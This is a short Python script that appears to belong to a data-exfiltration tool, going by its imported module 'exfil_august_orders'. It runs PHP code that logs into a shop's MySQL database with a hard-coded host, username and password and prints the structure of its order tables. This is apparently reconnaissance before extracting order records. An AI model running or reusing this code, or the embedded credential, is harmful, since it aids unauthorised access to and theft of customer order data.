import sys
from exfil_august_orders import run_php

PHP = '''<?php
$c = new mysqli("172.27.141.6","apifincadodev","1q2w3e4r5t6y","tienda",3308);
if ($c->connect_error) { echo "DBERR: ".$c->connect_error."\\n"; exit(1); }
foreach (["pedidos","datos_pedido"] as $t) {
  echo "== $t ==\\n";
  $r = $c->query("SHOW COLUMNS FROM tienda.$t");
  if (!$r) { echo "QERR: ".$c->error."\\n"; continue; }
  while ($row = $r->fetch_assoc()) { echo $row["Field"]." | ".$row["Type"]."\\n"; }
}
'''

print(run_php(PHP, "schema"))
